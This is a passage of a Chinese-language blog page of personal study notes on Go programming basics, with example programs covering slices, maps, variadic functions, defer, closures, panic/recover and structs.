class="keyword">if</span> a[i]+value == b &#123;</span><br><span class="line">				fmt.Printf(<span class="string">&quot;(%d,%d)&quot;</span>, index, i)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">package main</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">import</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="string">&quot;fmt&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="string">&quot;sort&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//因为数组的长度是固定的并且数组长度属于类型的一部分，所以数组有很多的局限性</span></span><br><span class="line">	<span class="comment">//切片（Slice）是一个拥有相同类型元素的可变长度的序列。</span></span><br><span class="line">	<span class="comment">//它是基于数组类型做的一层封装。它非常灵活，支持自动扩容</span></span><br><span class="line">	<span class="comment">//切片是一个引用类型，它的内部结构包含地址、长度和容量。切片一般用于快速地操作一块数据集合</span></span><br><span class="line">	<span class="comment">//切片能直接定义；也能从数组传参；也能从切片再切片</span></span><br><span class="line">	<span class="comment">//还可以用make函数创造切片</span></span><br><span class="line">	a := make([]<span class="keyword">int</span>, <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">	fmt.Println(a)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, a)</span><br><span class="line">	fmt.Println(len(a))</span><br><span class="line">	fmt.Println(cap(a))</span><br><span class="line">	<span class="comment">//切片之间是不能比较的，我们不能使用==操作符来判断两个切片是否含有全部相等元素</span></span><br><span class="line">	<span class="comment">//一个nil值的切片并没有底层数组，一个nil值的切片的长度和容量都是0</span></span><br><span class="line">	<span class="comment">//所以要判断一个切片是否是空的，要是用len(s) == 0来判断，不应该使用s == nil来判断</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//拷贝前后两个切片共享底层数组，对一个切片的修改会影响另一个切片的内容，这点需要特别和数组区别</span></span><br><span class="line">	<span class="comment">//这时就可以用copy函数，来创建一个空间不同，元素相同的切片</span></span><br><span class="line">	b := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">	c := b</span><br><span class="line">	d := make([]<span class="keyword">int</span>, <span class="number">6</span>, <span class="number">10</span>)</span><br><span class="line">	copy(d, b)</span><br><span class="line">	d[<span class="number">3</span>] = <span class="number">1000</span></span><br><span class="line">	fmt.Println(d)</span><br><span class="line">	fmt.Println(b)</span><br><span class="line">	c[<span class="number">4</span>] = <span class="number">100</span></span><br><span class="line">	fmt.Println(b)</span><br><span class="line">	fmt.Println(c)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//数组排序技巧</span></span><br><span class="line">	<span class="comment">//sort可以自动排序，但对象是切片</span></span><br><span class="line">	<span class="comment">//第一步先生成一个指向底层数组的切片</span></span><br><span class="line">	<span class="comment">//第二部对切片排序，从而也对数组排序</span></span><br><span class="line">	x := [...]<span class="keyword">int</span>&#123;<span class="number">312</span>, <span class="number">335</span>, <span class="number">765</span>, <span class="number">11</span>, <span class="number">657</span>, <span class="number">90</span>&#125;</span><br><span class="line">	<span class="comment">//Ints sorts a slice of ints in increasing order.</span></span><br><span class="line">	sort.Ints(x[:])</span><br><span class="line">	fmt.Println(x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;reflect&quot;</span></span><br><span class="line">	<span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//map</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//string to int</span></span><br><span class="line">	<span class="keyword">var</span> a <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span> <span class="comment">//未初始化，是nil</span></span><br><span class="line">	fmt.Println(a == <span class="literal">nil</span>)</span><br><span class="line">	<span class="comment">//初始化，用make</span></span><br><span class="line">	a = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>, <span class="number">8</span>)</span><br><span class="line">	<span class="comment">//未初始化的话不能直接赋值键值对</span></span><br><span class="line">	a[<span class="string">&quot;AAA&quot;</span>] = <span class="number">100</span></span><br><span class="line">	a[<span class="string">&quot;BBB&quot;</span>] = <span class="number">200</span></span><br><span class="line">	fmt.Println(a)</span><br><span class="line">	fmt.Println(reflect.TypeOf(a))</span><br><span class="line">	<span class="comment">//生命同时初始化</span></span><br><span class="line">	b := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">3</span>: <span class="string">&quot;xiaowang&quot;</span>,</span><br><span class="line">		<span class="number">1</span>: <span class="string">&quot;xiaoli&quot;</span>,</span><br><span class="line">		<span class="number">2</span>: <span class="string">&quot;xiaohong&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(b)</span><br><span class="line">	b[<span class="number">7</span>] = <span class="string">&quot;xiaoming&quot;</span></span><br><span class="line">	b[<span class="number">0</span>] = <span class="string">&quot;xiaoxiao&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//查询map中是否存在某键</span></span><br><span class="line">	value, ok := b[<span class="number">5</span>]</span><br><span class="line">	fmt.Println(value, ok) <span class="comment">//如果没有查询到，返回默认值，字符串就是空值</span></span><br><span class="line">	value, ok = b[<span class="number">7</span>]</span><br><span class="line">	fmt.Println(value, ok)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//删除键值对使用delete</span></span><br><span class="line">	<span class="built_in">delete</span>(b, <span class="number">2</span>)</span><br><span class="line">	fmt.Println(b)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//模拟map的排序功能</span></span><br><span class="line">	scoreMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>, <span class="number">100</span>)</span><br><span class="line">	<span class="comment">//生成随机序列</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">50</span>; i++ &#123;</span><br><span class="line">		key := fmt.Sprintf(<span class="string">&quot;stu%02d&quot;</span>, i)</span><br><span class="line">		value := rand.Intn(<span class="number">101</span>) <span class="comment">//0~100</span></span><br><span class="line">		scoreMap[key] = value</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// fmt.Println(scoreMap)   确实是无序的</span></span><br><span class="line">	<span class="comment">// 按key排序输出scoremap</span></span><br><span class="line">	<span class="comment">// 1.将key放入切片</span></span><br><span class="line">	keys := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="number">100</span>)</span><br><span class="line">	<span class="keyword">for</span> k := <span class="keyword">range</span> scoreMap &#123;</span><br><span class="line">		keys = <span class="built_in">append</span>(keys, k)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 2.将key排序</span></span><br><span class="line">	sort.Strings(keys)</span><br><span class="line">	<span class="comment">// 3.按找排序后的key顺序输出map的键值对</span></span><br><span class="line">	<span class="keyword">for</span> _, key := <span class="keyword">range</span> keys &#123;</span><br><span class="line">		fmt.Println(key, scoreMap[key])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 元素类型为map的slice</span></span><br><span class="line">	<span class="comment">// 先进行切片初始化</span></span><br><span class="line">	mapSlice := <span class="built_in">make</span>([]<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>, <span class="number">8</span>, <span class="number">8</span>)</span><br><span class="line">	<span class="comment">// 再进行map的初始化</span></span><br><span class="line">	mapSlice[<span class="number">0</span>] = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>, <span class="number">8</span>)</span><br><span class="line">	<span class="comment">// 可以赋值了</span></span><br><span class="line">	mapSlice[<span class="number">0</span>][<span class="string">&quot;AAAA&quot;</span>] = <span class="number">100</span></span><br><span class="line">	fmt.Println(mapSlice)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 元素类型为slice的map</span></span><br><span class="line">	<span class="comment">// 完成map的初始化</span></span><br><span class="line">	sliceMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>][]<span class="keyword">string</span>, <span class="number">8</span>)</span><br><span class="line">	sliceMap[<span class="string">&quot;中国&quot;</span>] = <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">4</span>, <span class="number">8</span>)</span><br><span class="line">	sliceMap[<span class="string">&quot;中国&quot;</span>][<span class="number">0</span>] = <span class="string">&quot;上海&quot;</span></span><br><span class="line">	sliceMap[<span class="string">&quot;中国&quot;</span>][<span class="number">1</span>] = <span class="string">&quot;广州&quot;</span></span><br><span class="line">	sliceMap[<span class="string">&quot;中国&quot;</span>][<span class="number">2</span>] = <span class="string">&quot;深圳&quot;</span></span><br><span class="line">	fmt.Println(sliceMap)</span><br><span class="line">	sliceMap[<span class="string">&quot;中国&quot;</span>] = <span class="built_in">append</span>(sliceMap[<span class="string">&quot;中国&quot;</span>], <span class="string">&quot;北京&quot;</span>, <span class="string">&quot;南京&quot;</span>)</span><br><span class="line">	fmt.Println(sliceMap)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="函数：可变参数"><a href="#函数：可变参数" class="headerlink" title="函数：可变参数"></a>函数：可变参数</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;reflect&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	ret:=changeE(<span class="number">10</span>,<span class="number">20</span>,<span class="number">40</span>)</span><br><span class="line">	fmt.Println(ret)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数接受可变参数，若输出，输出的type是slice</span></span><br><span class="line"><span class="comment">//可变参数一定要放在最后</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changeE</span><span class="params">(a ...<span class="keyword">int</span>)</span> <span class="title">int</span></span>&#123;</span><br><span class="line">	fmt.Println(a)</span><br><span class="line">	fmt.Println(reflect.TypeOf(a))</span><br><span class="line">	ret:=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> _,value:= <span class="keyword">range</span> a&#123;</span><br><span class="line">		ret+=value</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="defer：延迟执行"><a href="#defer：延迟执行" class="headerlink" title="defer：延迟执行"></a>defer：延迟执行</h3><p>看一下结果与上面有何不同便知</p>
<p>在Go语言的函数中<code>return</code>语句在底层并不是原子操作，它分为给返回值赋值和RET指令两步。而<code>defer</code>语句执行的时机就在返回值赋值操作后，RET指令执行前</p>
<p>处理资源释放或者时间问题</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;reflect&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	ret:=changeE(<span class="number">10</span>,<span class="number">20</span>,<span class="number">40</span>)</span><br><span class="line">	fmt.Println(ret)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数接受可变参数，若输出，输出的type是slice</span></span><br><span class="line"><span class="comment">//可变参数一定要放在最后</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changeE</span><span class="params">(a ...<span class="keyword">int</span>)</span> <span class="title">int</span></span>&#123;</span><br><span class="line">	<span class="keyword">defer</span> fmt.Println(a)</span><br><span class="line">	<span class="keyword">defer</span> fmt.Println(reflect.TypeOf(a))</span><br><span class="line">	ret:=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> _,value:= <span class="keyword">range</span> a&#123;</span><br><span class="line">		ret+=value</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>如果局部变量和全局变量重名，优先访问局部变量</p>
<h3 id="定义函数类型：type"><a href="#定义函数类型：type" class="headerlink" title="定义函数类型：type"></a>定义函数类型：type</h3><p>就像定义变量一样，将一类函数都定义为同一种</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;reflect&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	<span class="keyword">type</span> calculation <span class="function"><span class="keyword">func</span> <span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span><span class="title">int</span></span></span><br><span class="line">	<span class="keyword">var</span> c calculation=add</span><br><span class="line">	fmt.Println(c(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">	fmt.Println(reflect.TypeOf(c))  <span class="comment">//main.calculation</span></span><br><span class="line">    fmt.Println(cal(<span class="number">20</span>, <span class="number">40</span>, add))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(a,b <span class="keyword">int</span>)</span><span class="title">int</span></span>  &#123;</span><br><span class="line">	ret:=a+b</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cal</span><span class="params">(a, b <span class="keyword">int</span>, op <span class="keyword">func</span>(<span class="keyword">int</span>, <span class="keyword">int</span>)</span> <span class="title">int</span>) <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> op(a, b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>有点鸡肋，目前不知道适合什么场景，只能说便于快速执行，闭包里很好用</p>
<p>匿名函数就是没有函数名的函数</p>
<h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭包</span></span><br><span class="line"><span class="comment">// 定义一个函数，返回值也是函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">a</span><span class="params">()</span> <span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">	name := <span class="string">&quot;xiaoyuyu&quot;</span></span><br><span class="line">	<span class="comment">// 内部创建了一个匿名函数</span></span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;hello world!&quot;</span>, name)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 细品</span></span><br><span class="line"><span class="comment">// 文件后缀名检测</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">makeSuffixFunc</span><span class="params">(suffix <span class="keyword">string</span>)</span> <span class="title">func</span><span class="params">(<span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> !strings.HasSuffix(name, suffix) &#123;</span><br><span class="line">			<span class="keyword">return</span> name + suffix</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> name</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 闭包 = 函数 + 外层变量的应用(比如 name)</span></span><br><span class="line">	r := a()</span><br><span class="line">	r()</span><br><span class="line">	ans := makeSuffixFunc(<span class="string">&quot;.txt&quot;</span>) <span class="comment">// suffix=.txt</span></span><br><span class="line">	ret := ans(<span class="string">&quot;xiaoyuyu&quot;</span>)        <span class="comment">// name=xiaoyuyu</span></span><br><span class="line">	fmt.Println(ret)              <span class="comment">// xiaoyuyu.txt</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="panic-recover"><a href="#panic-recover" class="headerlink" title="panic/recover"></a>panic/recover</h3><ol>
<li><code>recover()</code>必须搭配<code>defer</code>使用。</li>
<li><code>defer</code>一定要在可能引发<code>panic</code>的语句之前定义</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// panic &amp;&amp; recover</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">funcA</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;func A&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用defer 配合 recover来抓取错误，并让程序继续运行</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">funcB</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		err := <span class="built_in">recover</span>()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;funcB error!&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="built_in">panic</span>(<span class="string">&quot;panic in B&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">funcC</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;func C&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	funcA()</span><br><span class="line">	funcB()</span><br><span class="line">	funcC()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="指针：一定要初始化-new-make"><a href="#指针：一定要初始化-new-make" class="headerlink" title="指针：一定要初始化(new/make)"></a>指针：一定要初始化(new/make)</h3><p>在Go语言中对于引用类型的变量，我们在使用的时候不仅要声明它，还要为它分配内存空间，否则我们的值就没办法存储。而对于值类型的声明不需要分配内存空间，是因为它们在声明的时候已经默认分配好了内存空间。要分配内存，就引出new和make</p>
<p>make函数是无可替代的，我们在使用slice、map以及channel的时候，都需要使用make进行初始化，然后才可以对它们进行操作</p>
<p>make也是用于内存分配的，区别于new，它只用于slice、map以及chan的内存创建，而且它返回的类型就是这三个类型本身，而不是他们的指针类型，因为这三种类型就是引用类型，所以就没有必要返回他们的指针了</p>
<h3 id="自定义类型与类型别名"><a href="#自定义类型与类型别名" class="headerlink" title="自定义类型与类型别名"></a>自定义类型与类型别名</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类型定义</span></span><br><span class="line"><span class="keyword">type</span> NewInt <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//类型别名</span></span><br><span class="line"><span class="keyword">type</span> MyInt = <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> a NewInt</span><br><span class="line">	<span class="keyword">var</span> b MyInt</span><br><span class="line">	</span><br><span class="line">	fmt.Printf(<span class="string">&quot;type of a:%T\n&quot;</span>, a) <span class="comment">//type of a:main.NewInt</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;type of b:%T\n&quot;</span>, b) <span class="comment">//type of b:int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><p>Go语言的结构体没有构造函数，我们可以自己实现。 例如，下方的代码就实现了一个<code>person</code>的构造函数。 因为<code>struct</code>是值类型，如果结构体比较复杂的话，值拷贝性能开销会比较大，所以该构造函数返回的是结构体指针类型</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newPerson</span><span class="params">(name, city <span class="keyword">string</span>, age <span class="keyword">int8</span>)</span> *<span class="title">person</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;person&#123;</span><br><span class="line">		name: name,</span><br><span class="line">		city: city,</span><br><span class="line">		age:  age,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="方法和接收者"><a href="#方法和接收者" class="headerlink" title="方法和接收者"></a>方法和接收者</h4><p>定义如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(接收者变量 接收者类型)</span> 方法名<span class="params">(参数列表)</span> <span class="params">(返回参数)</span></span> &#123;</span><br><span class="line">    函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>接收者变量：接收者中的参数变量名在命名时，官方建议使用接收者类型名称首字母的小写，而不是<code>self</code>、<code>this</code>之类的命名。例如，<code>Person</code>类型的接收者变量应该命名为 <code>p</code>，<code>Connector</code>类型的接收者变量应该命名为<code>c</code>等。</li>
<li>接收者类型：接收者类型和参数类似，可以是指针类型和非指针类型。</li>
<li>方法名、参数列表、返回参数：具体格式与函数定义相同。</li>
</ul>
<p>当方法作用于<code>值类型</code>接收者时，Go语言会在代码运行时将接收者的值复制一份。在值类型接收者的方法中可以获取接收者的成员值，但修改操作只是针对副本，无法修改接收者变量本身</p>
<p>什么时候应该使用<code>指针类型</code>接收者呢？</p>
<ol>
<li>需要修改接收者中的值</li>
<li>接收者是拷贝代价比较大的大对象</li>
<li>保证一致性，如果有某个方法使用了指针接收者，那么其他的方法也应该使用指针接收者</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Student 结构体</span></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">	name  <span class="keyword">string</span></span><br><span class="line">	age   <span class="keyword">int</span></span><br><span class="line">	score <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewStudent 构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewStudent</span><span class="params">(name <span class="keyword">string</span>, age <span class="keyword">int</span>, score <span class="keyword">int</span>)</span> *<span class="title">Student</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;Student&#123;</span><br><span class="line">		name: name,</span><br><span class="line">		age:  age,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dream Student 一个方法例子</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Student)</span> <span class="title">Dream</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s&#x27;s dream is to get into gradute school!\n&quot;</span>, s.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SetAge Student 修改学生的年龄</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Student)</span> <span class="title">SetAge</span><span class="params">(newAge <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	s.age = newAge</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	s1 := NewStudent(<span class="string">&quot;xiaoyuyu&quot;</span>, <span class="number">22</span>, <span class="number">312</span>)</span><br><span class="line">	s1.Dream()</span><br><span class="line">	s1.SetAge(<span class="number">50</span>)</span><br><span class="line">	fmt.Println(s1.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="嵌套结构体"><a href="#嵌套结构体" class="headerlink" title="嵌套结构体"></a>嵌套结构体</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Address 地址结构体</span></span><br><span class="line"><span class="keyword">type</span> Address <span class="keyword">struct</span> &#123;</span><br><span class="line">	Province <span class="keyword">string</span></span><br><span class="line">	City     <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//User 用户结构体</span></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name    <span class="keyword">string</span></span><br><span class="line">	Gender  <span class="keyword">string</span></span><br><span class="line">	Address Address</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	user1 := User&#123;</span><br><span class="line">		Name:   <span class="string">&quot;小王子&quot;</span>,</span><br><span class="line">		Gender: <span class="string">&quot;男&quot;</span>,</span><br><span class="line">		Address: Address&#123;</span><br><span class="line">			Province: <span class="string">&quot;山东&quot;</span>,</span><br><span class="line">			City:     <span class="string">&quot;威海&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;user1=%#v\n&quot;</span>, user1)<span class="comment">//user1=main.User&#123;Name:&quot;小王子&quot;, Gender:&quot;男&quot;, Address:main.Address&#123;Province:&quot;山东&quot;, City:&quot;威海&quot;&#125;&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="结构体的“继承”"><a href="#结构体的“继承”" class="headerlink" title="结构体的“继承”"></a>结构体的“继承”</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Animal struct</span></span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">struct</span> &#123;</span><br><span class="line">	name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Move Animal</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a Animal)</span> <span class="title">Move</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s can move\n&quot;</span>, a.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dog struct</span></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> &#123;</span><br><span class="line">	speed   <span class="keyword">int</span></span><br><span class="line">	*Animal <span class="comment">// 匿名潜逃</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bark Dog</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Dog)</span> <span class="title">bark</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s can bark!\n&quot;</span>,d.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	d := Dog&#123;</span><br><span class="line">		speed: <span class="number">20</span>,</span><br><span class="line">		Animal: &amp;Animal&#123;</span><br><span class="line">			name: <span class="string">&quot;xiaoli&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	d.Move()</span><br><span class="line">	d.bark()</span><br><span 